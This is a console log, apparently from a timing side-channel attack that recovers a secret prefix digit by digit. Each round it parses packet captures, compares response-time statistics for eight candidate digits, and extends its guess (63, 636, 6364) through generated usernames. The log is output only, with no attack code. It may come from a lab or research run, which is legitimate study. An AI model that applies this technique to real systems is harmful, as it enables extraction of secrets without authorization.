636 2211
637 2213
k1 k2 p
630  631  0.480164922292
630  632  0.93709982126
630  633  0.85566431482
630  634  0.273911502142
630  635  0.487015664253
630  636  0.144928438499
630  637  0.345014924447
631  632  0.551913628983
631  633  0.469343247856
631  634  0.821216777354
631  635  0.341441569469
631  636  0.0608622010278
631  637  0.313668889731
632  633  0.549970439234
632  634  0.428959625486
632  635  0.215472798511
632  636  0.394541062822
632  637  0.174256120718
633  634  0.379133388817
633  635  0.961512914338
633  636  0.176607580364
633  637  0.299032534804
634  635  0.246404940629
634  636  0.0272421942165
634  637  0.678223132656
635  636  0.0266866756779
635  637  0.479601144791
636  637  0.00982123597262
{'631': 1, '634': 1, '635': 1, '636': 4, '637': 1}
Collecting data:
57100 1265.418234 29.698264
57200 1267.595444 45.930345
57300 1269.772619 45.931079
57400 1271.950851 45.908793
57500 1274.128014 45.931331
57600 1276.306037 45.913200
57700 1278.484301 45.908115
57800 1280.661877 45.922626
57900 1282.840076 45.909486
58000 1285.017872 45.917980
58100 1287.194969 45.932729
58200 1289.372164 45.930657
58300 1291.549822 45.920891
58400 1293.727474 45.921022
58500 1295.906055 45.901438
58600 1298.083429 45.926880
58700 1300.260787 45.927222
58800 1302.437980 45.930702
58900 1304.615709 45.919393
59000 1306.793519 45.917689
59100 1308.971032 45.923948
59200 1311.148804 45.918493
59300 1313.326348 45.923295
59400 1315.503959 45.921887
59500 1317.681134 45.931079
59600 1319.858428 45.928570
59700 1322.036407 45.914125
59800 1324.214075 45.920680
59900 1326.391339 45.929203
60000 1328.569281 45.914904
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-15-00-26.pcap
Parsing  data/2014-10-30-15-00-41.pcap
Parsing  data/2014-10-30-15-00-56.pcap
Parsing  data/2014-10-30-15-01-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2551
631 2549
632 2548
633 2550
634 2550
635 2549
636 2548
637 2551
k1 k2 p
630  631  0.675419714907
630  632  0.831671937782
630  633  0.914924329176
630  634  0.365242610555
630  635  0.321607513779
630  636  0.146158042073
630  637  0.209645472921
631  632  0.478920623114
631  633  0.517571840587
631  634  0.758402081948
631  635  0.195178911193
631  636  0.0911909437002
631  637  0.230902914998
632  633  0.925669175889
632  634  0.229178609347
632  635  0.208256703898
632  636  0.577943101821
632  637  0.231747426552
633  634  0.223820696208
633  635  0.802063258643
633  636  0.41178533273
633  637  0.280484761257
634  635  0.0898409577424
634  636  0.0333517487816
634  637  0.579508726089
635  636  0.0510494166632
635  637  0.311489348692
636  637  0.0206430445785
{'631': 1, '634': 2, '635': 2, '636': 4, '637': 1}
Collecting data:
60100 1331.903813 29.989216
60200 1334.081037 45.930048
60300 1336.258980 45.914884
60400 1338.436346 45.927051
60500 1340.614055 45.919820
60600 1342.792394 45.906537
60700 1344.970768 45.905798
60800 1347.148108 45.927599
60900 1349.325509 45.926312
61000 1351.503485 45.914190
61100 1353.681513 45.913090
61200 1355.859755 45.908582
61300 1358.038041 45.907652
61400 1360.236157 45.493508
61500 1362.413904 45.919016
61600 1364.591649 45.919056
61700 1366.769309 45.920851
61800 1368.946818 45.924034
61900 1371.125358 45.902302
62000 1373.303060 45.919966
62100 1375.480846 45.918197
62200 1377.658399 45.923104
62300 1379.836468 45.912230
62400 1382.014247 45.918342
62500 1384.191988 45.919142
62600 1386.369686 45.920047
62700 1388.547173 45.924501
62800 1390.724857 45.920343
62900 1392.902239 45.926714
63000 1395.079617 45.926799
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-15-01-26.pcap
Parsing  data/2014-10-30-15-01-41.pcap
Parsing  data/2014-10-30-15-01-56.pcap
Parsing  data/2014-10-30-15-02-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2889
631 2886
632 2886
633 2888
634 2887
635 2887
636 2885
637 2889
k1 k2 p
630  631  0.636584422158
630  632  0.771984315078
630  633  0.883396261393
630  634  0.617724349365
630  635  0.188878599607
630  636  0.0962364148975
630  637  0.313080727614
631  632  0.546077394193
631  633  0.581033469131
631  634  0.691586260272
631  635  0.0504006295772
631  636  0.12919502814
631  637  0.204776630746
632  633  0.943412132277
632  634  0.395918588108
632  635  0.093122487817
632  636  0.570454622312
632  637  0.287547132224
633  634  0.326239233125
633  635  0.264687310812
633  636  0.32151950017
633  637  0.415415177404
634  635  0.283970036548
634  636  0.0642733384311
634  637  0.832131186838
635  636  0.0151907350247
635  637  0.698406303303
636  637  0.0377874549826
{'630': 1, '631': 1, '632': 1, '634': 1, '635': 3, '636': 4, '637': 1}
Collecting data:
63100 1398.465054 29.538284
63200 1400.642563 45.924034
63300 1402.821261 45.898976
63400 1404.998434 45.931120
63500 1407.176034 45.922118
63600 1409.353721 45.920278
63700 1411.531645 45.915286
63800 1413.708797 45.931567
63900 1415.886237 45.925487
64000 1418.064044 45.917754
64100 1420.256089 45.619502
64200 1422.433711 45.921650
64300 1424.613826 45.869140
64400 1426.791759 45.915095
64500 1428.969114 45.927282
64600 1431.147679 45.901774
64700 1433.326283 45.900955
64800 1435.505015 45.898253
64900 1437.683885 45.895350
65000 1439.862601 45.898595
65100 1442.041523 45.894255
65200 1444.220390 45.895410
65300 1446.399187 45.896887
65400 1448.577527 45.906517
65500 1450.756287 45.897665
65600 1452.935108 45.896385
65700 1455.113696 45.901287
65800 1457.293248 45.880992
65900 1459.471779 45.902488
66000 1461.651041 45.887096
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-15-02-26.pcap
Parsing  data/2014-10-30-15-02-41.pcap
Parsing  data/2014-10-30-15-02-56.pcap
Parsing  data/2014-10-30-15-03-11.pcap
Parsing  data/2014-10-30-15-03-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 3312
631 3310
632 3310
633 3310
634 3311
635 3311
636 3308
637 3312
k1 k2 p
630  631  0.570899752846
630  632  0.461114355472
630  633  0.544647440195
630  634  0.749237683771
630  635  0.319525694139
630  636  0.00596181251709
630  637  0.592286207363
631  632  0.126809993715
631  633  0.442489119273
631  634  0.995639739691
631  635  0.0745349156967
631  636  0.0245656467426
631  637  0.538423419257
632  633  0.896151182446
632  634  0.192122723844
632  635  0.0320557442196
632  636  0.401795001776
632  637  0.389052699511
633  634  0.406491764512
633  635  0.204205842898
633  636  0.0993496407477
633  637  0.683318514526
634  635  0.183705895551
634  636  0.0288955972098
634  637  0.79169993991
635  636  0.00135047200345
635  637  0.175098917747
636  637  0.0666025004975
{'630': 1,
 '631': 2,
 '632': 1,
 '633': 1,
 '634': 1,
 '635': 3,
 '636': 6,
 '637': 1}
CHANGING GUESS:  636
Guess time:  597.373803139
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 636
66100 1465.242987 27.840063
66200 1467.421689 45.898886
66300 1469.600938 45.887367
66400 1471.779975 45.891835
66500 1473.957655 45.920429
66600 1476.135740 45.911889
66700 1478.313417 45.920494
66800 1480.491161 45.919076
66900 1482.668750 45.922349
67000 1484.847370 45.900619
67100 1487.025659 45.907587
67200 1489.203705 45.912713
67300 1491.381773 45.912250
67400 1493.559632 45.916653
67500 1495.737847 45.909150
67600 1497.916002 45.910416
67700 1500.093950 45.914779
67800 1502.272222 45.907949
67900 1504.450277 45.912522
68000 1506.628342 45.912316
68100 1508.806093 45.918931
68200 1510.983787 45.920132
68300 1513.161289 45.924185
68400 1515.339013 45.919499
68500 1517.517163 45.910522
68600 1519.694967 45.917815
68700 1521.873637 45.899564
68800 1524.051583 45.914819
68900 1526.229331 45.918996
69000 1528.407064 45.919313
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-15-03-56.pcap
Parsing  data/2014-10-30-15-04-11.pcap
Parsing  data/2014-10-30-15-04-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 258
6362 258
6361 259
6360 258
6367 258
6366 258
6365 259
6364 258
Collecting data:
69100 1531.289256 34.695813
69200 1533.467364 45.911406
69300 1535.645294 45.915161
69400 1537.823424 45.910939
69500 1540.001174 45.918956
69600 1542.178754 45.922535
69700 1544.356594 45.917056
69800 1546.534656 45.912376
69900 1548.712769 45.911301
70000 1550.890847 45.912039
70100 1553.069203 45.906175
70200 1555.246848 45.921168
70300 1557.424367 45.923828
70400 1559.602143 45.918403
70500 1561.780186 45.912778
70600 1563.958300 45.911276
70700 1566.135993 45.920157
70800 1568.313590 45.922178
70900 1570.491405 45.917583
71000 1572.669128 45.919524
71100 1574.846598 45.924858
71200 1577.024811 45.909190
71300 1579.202941 45.910944
71400 1581.380949 45.913512
71500 1583.558862 45.915517
71600 1585.736425 45.922897
71700 1587.914255 45.917262
71800 1590.091749 45.924356
71900 1592.269862 45.911301
72000 1594.448339 45.903628
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-15-04-41.pcap
Parsing  data/2014-10-30-15-04-56.pcap
Parsing  data/2014-10-30-15-05-11.pcap
Parsing  data/2014-10-30-15-05-26.pcap
Parsing  data/2014-10-30-15-05-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 684
6362 685
6361 685
6360 684
6367 685
6366 684
6365 686
6364 684
Collecting data:
72100 1597.548250 32.258991
72200 1599.725866 45.921776
72300 1601.903480 45.921821
72400 1604.080983 45.924164
72500 1606.259072 45.911803
72600 1608.437189 45.911215
72700 1610.616168 45.893055
72800 1612.794355 45.909743
72900 1614.971860 45.924119
73000 1617.149654 45.918026
73100 1619.327265 45.921882
73200 1621.505292 45.913115
73300 1623.683282 45.913889
73400 1625.861202 45.915372
73500 1628.038875 45.920575
73600 1630.216579 45.919926
73700 1632.394151 45.922706
73800 1634.571844 45.920152
73900 1636.750144 45.907361
74000 1638.928810 45.899644
74100 1641.107120 45.907150
74200 1643.284995 45.916317
74300 1645.462566 45.922726
74400 1647.640296 45.919378
74500 1649.817877 45.922515
74600 1651.995995 45.911195
74700 1654.173758 45.918679
74800 1656.351506 45.918996
74900 1658.529086 45.922535
75000 1660.706614 45.923637
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-15-05-56.pcap
Parsing  data/2014-10-30-15-06-11.pcap
Parsing  data/2014-10-30-15-06-26.pcap
Parsing  data/2014-10-30-15-06-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 1024
6362 1023
6361 1024
6360 1023
6367 1023
6366 1023
6365 1024
6364 1024
Collecting data:
75100 1663.723564 33.146059
75200 1665.902003 45.904427
75300 1668.079938 45.915055
75400 1670.257968 45.913050
75500 1672.436415 45.904261
75600 1674.614154 45.919182
75700 1676.791900 45.919041
75800 1678.969555 45.920952
75900 1681.147511 45.914613
76000 1683.325751 45.908622
76100 1685.503476 45.919479
76200 1687.681168 45.920177
76300 1689.858828 45.920851
76400 1692.036471 45.921208
76500 1694.214015 45.923300
76600 1696.392024 45.913492
76700 1698.570237 45.909195
76800 1700.748150 45.915512
76900 1702.926557 45.905105
77000 1705.104647 45.911788
77100 1707.283130 45.903502
77200 1709.460702 45.922706
77300 1711.638830 45.910984
77400 1713.817381 45.902066
77500 1715.995644 45.908140
77600 1718.173304 45.920851
77700 1720.373194 45.456820
77800 1722.550893 45.920027
77900 1724.728683 45.918111
78000 1726.906759 45.912080
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-15-06-56.pcap
Parsing  data/2014-10-30-15-07-11.pcap
Parsing  data/2014-10-30-15-07-26.pcap
Parsing  data/2014-10-30-15-07-41.pcap
Parsing  data/2014-10-30-15-07-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 1449
6362 1449
6361 1449
6360 1449
6367 1449
6366 1448
6365 1450
6364 1449
Collecting data:
78100 1730.043415 31.881086
78200 1732.222375 45.893457
78300 1734.400047 45.920595
78400 1736.578099 45.912587
78500 1738.756240 45.910708
78600 1740.934567 45.906793
78700 1743.112628 45.912396
78800 1745.290385 45.918805
78900 1747.468469 45.911909
79000 1749.646162 45.920157
79100 1751.823732 45.922747
79200 1754.001357 45.921590
79300 1756.179600 45.908562
79400 1758.357612 45.913427
79500 1760.535505 45.915940
79600 1762.713953 45.904241
79700 1764.891818 45.916528
79800 1767.069883 45.912311
79900 1769.247671 45.918151
80000 1771.426014 45.906457
80100 1773.604109 45.911678
80200 1775.782181 45.912165
80300 1777.960189 45.913512
80400 1780.138198 45.913492
80500 1782.316017 45.917503
80600 1784.493661 45.921188
80700 1786.672071 45.905040
80800 1788.850575 45.903060
80900 1791.028862 45.907632
81000 1793.207236 45.905798
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-15-08-11.pcap
Parsing  data/2014-10-30-15-08-26.pcap
Parsing  data/2014-10-30-15-08-41.pcap
Parsing  data/2014-10-30-15-08-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 1788
6362 1787
6361 1787
6360 1788
6367 1788
6366 1787
6365 1789
6364 1788
k1 k2 p
6363  6362  0.196255153636
6363  6361  0.797607786559
6363  6360  0.883592095156
6363  6367  0.743082340877
6363  6366  0.927470218601
6363  6365  0.37478822561
6363  6364  0.0526851546526
6362  6361  0.466135868782
6362  6360  0.331636781097
6362  6367  0.225880870039
6362  6366  0.277517211891
6362  6365  0.519667601339
6362  6364  0.000299170942364
6361  6360  0.793573574341
6361  6367  0.849400746526
6361  6366  0.892942739241
6361  6365  0.902114316198
6361  6364  0.00843728579293
6360  6367  0.676924103147
6360  6366  0.660875340223
6360  6365  0.929910189293
6360  6364  0.00947774512619
6367  6366  0.837559876559
6367  6365  0.546919534157
6367  6364  0.0427973980994
6366  6365  0.679775859023
6366  6364  0.0581992845211
6365  6364  0.0184292160122
{'6360': 1,
 '6361': 1,
 '6362': 1,
 '6363': 1,
 '6364': 7,
 '6365': 1,
 '6366': 1,
 '6367': 1}
CHANGING GUESS:  6364
Guess time:  331.00585413
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 6364
81100 1796.421148 31.114729
81200 1798.599272 45.911069
81300 1800.778719 45.883200
81400 1802.956641 45.915326
81500 1805.134793 45.910476
81600 1807.312821 45.913095
81700 1809.491031 45.909255
81800 1811.668827 45.917980
81900 1813.846325 45.924270
82000 1816.024517 45.909632
82100 1818.202627 45.911366
82200 1820.380340 45.919730
82300 1822.558957 45.900679
82400 1824.737143 45.909763
82500 1826.914895 45.918910
82600 1829.092403 45.924059
82700 1831.270910 45.902995
82800 1833.448866 45.914608
82900 1835.627374 45.902980
83000 1837.805351 45.914165
83100 1839.982799 45.925321
83200 1842.160983 45.909803
83300 1844.338887 45.915708
83400 1846.517284 45.905316
83500 1848.695502 45.909084
83600 1850.874030 45.902553
83700 1853.052690 45.899775
83800 1855.230446 45.918825
83900 1857.408573 45.911009
84000 1859.586477 45.915703
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-09-26.pcap
Parsing  data/2014-10-30-15-09-41.pcap
Parsing  data/2014-10-30-15-09-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 258
63645 258
63646 258
63647 258
63640 258
63641 259
63642 258
63643 258
Collecting data:
84100 1862.479533 34.565526
84200 1864.657392 45.916653
84300 1866.834831 45.925512
84400 1869.012447 45.921776
84500 1871.190016 45.922772
84600 1873.367737 45.919564
84700 1875.545700 45.914462
84800 1877.723539 45.917076
84900 1879.901468 45.915181
85000 1882.080265 45.896887
85100 1884.257956 45.920197
85200 1886.435641 45.920323
85300 1888.613272 45.921464
85400 1890.791450 45.909929
85500 1892.969077 45.921545
85600 1895.147374 45.907426
85700 1897.324883 45.924034
85800 1899.502597 45.919710
85900 1901.680210 45.921842
86000 1903.857897 45.920283
86100 1906.035617 45.919584
86200 1908.213657 45.912838
86300 1910.391390 45.919313
86400 1912.569338 45.914779
86500 1914.746783 45.925386
86600 1916.924792 45.913492
86700 1919.102290 45.924270
86800 1921.279855 45.922852
86900 1923.457787 45.915115
87000 1925.635564 45.918383
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-10-11.pcap
Parsing  data/2014-10-30-15-10-26.pcap
Parsing  data/2014-10-30-15-10-41.pcap
Parsing  data/2014-10-30-15-10-56.pcap
Parsing  data/2014-10-30-15-11-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 685
63645 684
63646 684
63647 685
63640 684
63641 684
63642 684
63643 685
Collecting data:
87100 1928.726537 32.352273
87200 1930.904235 45.920047
87300 1933.082238 45.913623
87400 1935.260307 45.912225
87500 1937.438576 45.908014
87600 1939.616200 45.921610
87700 1941.795103 45.894652
87800 1943.973293 45.909677
87900 1946.151152 45.916653
88000 1948.328932 45.918322
88100 1950.506821 45.916025
88200 1952.684689 45.916462
88300 1954.862806 45.911215
88400 1957.040511 45.919901
88500 1959.218089 45.922581
88600 1961.395775 45.920303
88700 1963.573482 45.919861
88800 1965.751849 45.905949
88900 1967.930228 45.905693
89000 1970.108232 45.913597
89100 1972.286494 45.908160
89200 1974.464279 45.918217
89300 1976.641778 45.924245
89400 1978.819456 45.920469
89500 1980.997621 45.910205
89600 1983.175767 45.910607
89700 1985.353983 45.909130
89800 1987.531548 45.922852
89900 1989.709241 45.920157
90000 1991.886970 45.919393
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-11-26.pcap
Parsing  data/2014-10-30-15-11-41.pcap
Parsing  data/2014-10-30-15-11-56.pcap
Parsing  data/2014-10-30-15-12-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 1024
63645 1023
63646 1024
63647 1023
63640 1023
63641 1024
63642 1023
63643 1023
Collecting data:
90100 1994.892535 33.271615
90200 1997.070671 45.910813
90300 1999.248312 45.921253
90400 2001.427029 45.898570
90500 2003.604740 45.919775
90600 2005.782224 45.924567
90700 2007.959919 45.920112
90800 2010.137661 45.919122
90900 2012.315336 45.920534
91000 2014.493387 45.912607
91100 2016.671121 45.919288
91200 2018.848672 45.923154
91300 2021.026362 45.920218
91400 2023.203992 45.921480
91500 2025.382497 45.903040
91600 2027.560400 45.915729
91700 2029.738939 45.902322
91800 2031.917555 45.900699
91900 2034.095355 45.917900
92000 2036.273013 45.920891
92100 2038.450153 45.931819
92200 2040.636040 45.748022
92300 2042.829166 45.597016
92400 2045.009083 45.873304
92500 2047.188406 45.885810
92600 2049.368818 45.862891
92700 2051.548322 45.882001
92800 2053.726970 45.900026
92900 2055.905037 45.912271
93000 2058.082757 45.919584
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-12-26.pcap
Parsing  data/2014-10-30-15-12-41.pcap
Parsing  data/2014-10-30-15-12-56.pcap
Parsing  data/2014-10-30-15-13-11.pcap
Parsing  data/2014-10-30-15-13-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 1449
63645 1448
63646 1449
63647 1450
63640 1449
63641 1449
63642 1448
63643 1449
Collecting data:
93100 2061.247648 31.596665
93200 2063.426924 45.886799
93300 2065.606126 45.888356
93400 2067.785148 45.892146
93500 2069.964281 45.889812
93600 2072.144014 45.877178
93700 2074.324582 45.859611
93800 2076.504154 45.880570
93900 2078.683488 45.885574
94000 2080.862220 45.898258
94100 2083.039846 45.921570
94200 2085.217584 45.919202
94300 2087.395875 45.907552
94400 2089.573911 45.912924
94500 2091.752658 45.897937
94600 2093.930826 45.910145
94700 2096.108470 45.921188
94800 2098.286023 45.923104
94900 2100.464003 45.914105
95000 2102.642802 45.896847
95100 2104.820516 45.919710
95200 2106.998562 45.912713
95300 2109.176396 45.917181
95400 2111.354418 45.913220
95500 2113.532002 45.922455
95600 2115.710425 45.904763
95700 2117.888324 45.915814
95800 2120.066201 45.916276
95900 2122.244541 45.906517
96000 2124.422242 45.919986
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-13-41.pcap
Parsing  data/2014-10-30-15-13-56.pcap
Parsing  data/2014-10-30-15-14-11.pcap
Parsing  data/2014-10-30-15-14-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 1787
63645 1787
63646 1788
63647 1787
63640 1788
63641 1788
63642 1787
63643 1787
k1 k2 p
63644  63645  0.703809061177
63644  63646  0.565417633626
63644  63647  0.221823702733
63644  63640  0.28281643217
63644  63641  0.37655204671
63644  63642  0.504360129788
63644  63643  0.838864915033
63645  63646  0.178729657662
63645  63647  0.760603604389
63645  63640  0.598891600293
63645  63641  0.596828050465
63645  63642  0.305603205528
63645  63643  0.722031939
63646  63647  0.0517552804963
63646  63640  0.0325942864679
63646  63641  0.222546953468
63646  63642  0.94064939708
63646  63643  0.327134676006
63647  63640  0.705707184477
63647  63641  0.337796010924
63647  63642  0.115480194701
63647  63643  0.222616805453
63640  63641  0.84988250506
63640  63642  0.0490841389719
63640  63643  0.492162210425
63641  63642  0.148634565255
63641  63643  0.422933537294
63642  63643  0.188642644568
{'63640': 2, '63642': 1, '63646': 2, '63647': 1}
Collecting data:
96100 2127.615029 31.320597
96200 2129.792718 45.920243
96300 2131.970590 45.916377
96400 2134.148023 45.925638
96500 2136.326792 45.897480
96600 2138.504363 45.922726
96700 2140.682000 45.921339
96800 2142.859740 45.919162
96900 2145.037777 45.912904
97000 2147.216061 45.907693
97100 2149.393512 45.925261
97200 2151.572086 45.901583
97300 2153.749810 45.919504
97400 2155.927724 45.915492
97500 2158.105233 45.924039
97600 2160.283190 45.914588
97700 2162.461300 45.911361
97800 2164.638898 45.922158
97900 2166.816884 45.913979
98000 2168.994867 45.914040
98100 2171.172247 45.926759
98200 2173.349819 45.922706
98300 2175.527837 45.913301
98400 2177.705499 45.920811
98500 2179.882881 45.926714
98600 2182.062034 45.889385
98700 2184.239684 45.921062
98800 2186.417183 45.924250
98900 2188.594958 45.918423
99000 2190.772932 45.914231
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-14-41.pcap
Parsing  data/2014-10-30-15-14-56.pcap
Parsing  data/2014-10-30-15-15-11.pcap
Parsing  data/2014-10-30-15-15-26.pcap
Parsing  data/2014-10-30-15-15-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 2213
63645 2212
63646 2213
63647 2211
63640 2212
63641 2212
63642 2212
63643 2211
k1 k2 p
63644  63645  0.473948889542
63644  63646  0.498287781017
63644  63647  0.504311731254
63644  63640  0.188152920509
63644  63641  0.264294823448
63644  63642  0.390260578362
63644  63643  0.872383281428
63645  63646  0.220490854975
63645  63647  0.878576471111
63645  63640  0.869059964678
63645  63641  0.943850212175
63645  63642  0.238254697372
63645  63643  0.944309156692
63646  63647  0.273244833358
63646  63640  0.0569402013792
63646  63641  0.228219966014
63646  63642  0.874335456329
63646  63643  0.430371611559
63647  63640  0.495045864201
63647  63641  0.344265298117
63647  63642  0.511544764073
63647  63643  0.80949516333
63640  63641  0.732767638851
63640  63642  0.0598127538252
63640  63643  0.344502783919
63641  63642  0.09718571312
63641  63643  0.703343821254
63642  63643  0.305379006521
{'63640': 2, '63641': 1, '63642': 2, '63646': 1}
Collecting data:
99100 2194.165942 29.472357
99200 2196.344559 45.900679
99300 2198.522194 45.921379
99400 2200.699903 45.919815
99500 2202.877484 45.922515
99600 2205.055187 45.919946
99700 2207.232886 45.920027
99800 2209.410429 45.923320
99900 2211.588557 45.910984
100000 2213.766276 45.919604
100100 2215.943531 45.929395
100200 2218.121117 45.922410
100300 2220.298778 45.920831
100400 2222.476414 45.921359
100500 2224.654103 45.920238
100600 2226.831923 45.917478
100700 2229.009410 45.924496
100800 2231.187551 45.910713
100900 2233.366234 45.899288
101000 2235.545181 45.893728
101100 2237.724206 45.892086
101200 2239.902659 45.904135
101300 2242.082197 45.881283
101400 2244.261081 45.895054
101500 2246.439610 45.902533
101600 2248.617984 45.905798
101700 2250.797183 45.888421
101800 2252.975183 45.913683
101900 2255.153754 45.901649
102000 2257.332160 45.905125
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-15-56.pcap
Parsing  data/2014-10-30-15-16-11.pcap
Parsing  data/2014-10-30-15-16-26.pcap
Parsing  data/2014-10-30-15-16-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 2550
63645 2549
63646 2550
63647 2549
63640 2550
63641 2549
63642 2549
63643 2548
k1 k2 p
63644  63645  0.386684191063
63644  63646  0.509032927568
63644  63647  0.518857419929
63644  63640  0.221792068711
63644  63641  0.238025578462
63644  63642  0.687890488405
63644  63643  0.825253982137
63645  63646  0.0978606835027
63645  63647  0.906292125948
63645  63640  0.983021981279
63645  63641  0.987060294378
63645  63642  0.297185349142
63645  63643  0.809101068016
63646  63647  0.180158105321
63646  63640  0.0520516226173
63646  63641  0.139568607113
63646  63642  0.841514756031
63646  63643  0.464912532475
63647  63640  0.574830057966
63647  63641  0.612297952301
63647  63642  0.535009510933
63647  63643  0.888945496593
63640  63641  0.72880638409
63640  63642  0.155917360827
63640  63643  0.560678887366
63641  63642  0.120482487929
63641  63643  0.703718750071
63642  63643  0.454135623665
{'63640': 1, '63645': 1, '63646': 2}
Collecting data:
102100 2260.638513 30.244804
102200 2262.816182 45.920660
102300 2264.993829 45.921128
102400 2267.171891 45.912376
102500 2269.349475 45.922450
102600 2271.527539 45.912336
102700 2273.704952 45.926060
102800 2275.882543 45.922304
102900 2278.060339 45.917986
103000 2280.238139 45.917900
103100 2282.416019 45.916211
103200 2284.594208 45.909698
103300 2286.771846 45.921314
103400 2288.949163 45.928087
103500 2291.126682 45.923823
103600 2293.304314 45.921439
103700 2295.482288 45.914231
103800 2297.660175 45.916065
103900 2299.838239 45.912336
104000 2302.016776 45.902362
104100 2304.194655 45.916236
104200 2306.372193 45.923420
104300 2308.549582 45.926568
104400 2310.727533 45.914713
104500 2312.910605 45.807013
104600 2315.101097 45.651841
104700 2317.280308 45.888170
104800 2319.458062 45.918870
104900 2321.638399 45.864466
105000 2323.817762 45.884967
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-16-56.pcap
Parsing  data/2014-10-30-15-17-11.pcap
Parsing  data/2014-10-30-15-17-26.pcap
Parsing  data/2014-10-30-15-17-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 2888
63645 2886
63646 2888
63647 2887
63640 2887
63641 2888
63642 2887
63643 2886
k1 k2 p
63644  63645  0.337824950365
63644  63646  0.574608994646
63644  63647  0.260988957962
63644  63640  0.123537096634
63644  63641  0.637508008198
63644  63642  0.810970886387
63644  63643  0.535259910661
63645  63646  0.0579239146021
63645  63647  0.83025576573
63645  63640  0.862376612845
63645  63641  0.941642038099
63645  63642  0.528413661794
63645  63643  0.85533205789
63646  63647  0.0491500767954
63646  63640  0.0208214845989
63646  63641  0.118544353823
63646  63642  0.279314853568
63646  63643  0.121347012089
63647  63640  0.468265180167
63647  63641  0.587054430325
63647  63642  0.747332847687
63647  63643  0.871590974969
63640  63641  0.574401461076
63640  63642  0.261924339286
63640  63643  0.63231676967
63641  63642  0.337198828982
63641  63643  0.802164117163
63642  63643  0.655920516268
{'63640': 1, '63645': 1, '63646': 3, '63647': 1}
Collecting data:
105100 2327.197292 29.589914
105200 2329.374800 45.924059
105300 2331.554238 45.883386
105400 2333.732069 45.917247
105500 2335.914700 45.816265
105600 2338.097754 45.807388
105700 2340.288326 45.650177
105800 2342.483511 45.554248
105900 2344.669107 45.754110
106000 2346.848368 45.887116
106100 2349.026319 45.914713
106200 2351.204142 45.917412
106300 2353.381755 45.921842
106400 2355.559699 45.914864
106500 2357.737944 45.908517
106600 2359.915797 45.916784
106700 2362.094141 45.906431
106800 2364.272022 45.916191
106900 2366.449809 45.918172
107000 2368.627406 45.922178
107100 2370.805290 45.916131
107200 2372.982880 45.922324
107300 2375.161165 45.907678
107400 2377.338943 45.918363
107500 2379.516674 45.919353
107600 2381.694457 45.918257
107700 2383.871956 45.924245
107800 2386.050589 45.900343
107900 2388.228173 45.922455
108000 2390.405942 45.918554
Current guess:  6364
Parsing data...
Parsing  data/2014-10-30-15-17-56.pcap
Parsing  data/2014-10-30-15-18-11.pcap
Parsing  data/2014-10-30-15-18-26.pcap
Parsing  data/2014-10-30-15-18-41.pcap
Parsing  data/2014-10-30-15-18-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
63644 3311
63645 3310
63646 3311
63647 3310
63640 3311
63641 3311
63642 3310
63643 3308
k1 k2 p
63644  63645  0.302257517661
63644  63646  0.223620939458
63644  63647  0.411858060669
63644  63640  0.364584886828
63644  63641  0.930304323624
63644  63642  0.956272828853
63644  63643  0.942411172649
63645  63646  0.0132219185918
63645  63647  0.899301345293
63645  63640  0.994584865188
63645  63641  0.673651957629
63645  63642  0.320401327068
63645  63643  0.508318825085
63646  63647  0.0195353980756
63646  63640  0.0215473942642
63646  63641  0.0703151117671
63646  63642  0.147008079599
63646  63643  0.227643841758
63647  63640  0.835217904364
63647  63641  0.617050851457
63647  63642  0.620251986667
63647  63643  0.633683296072
63640  63641  0.758836734263
63640  63642  0.441780299319
63640  63643  0.596305526887
63641  63642  0.610086508995
63641  63643  0.689391400347
63642  63643  0.773573514148
{'63640': 1, '63641': 1, '63645': 1, '63646': 4, '63647': 1}
Collecting data:
108100 2393.962935 28.113634
108200 2396.140675 45.919162
108300 2398.318676 45.913663
108400 2400.496914 45.908667
108500 2402.674581 45.920700
108600 2404.852310 45.919398
108700 2407.029854 45.923295
108800 2409.207462 45.921947
108900 2411.385188 45.919458
109000 2413.565821 45.858247
109100 2415.746469 45.857927
109200 2417.924238 45.918554
109300 2420.101775 45.923445
109400 2422.279935 45.910306
109500 2424.457593 45.920896
109600 2426.635043 45.925276
109700 2428.812519 45.924733
109800 2430.990542 45.913200
109900 2433.168094 45.923129
110000 2435.345708 45.921816
110100 2437.523507 45.917920
110200 2439.701277 45.918533
110300 2441.880096 45.896425
110400 2444.059011 45.894401
110500 2446.238017 45.892483
110600 2448.417030 45.892337
110700 2450.595880 45.895772
110800 2452.775260 45.884611
110900 2454.954152 45.894883
111000 2457.132970 45.896445
Current guess:  6364
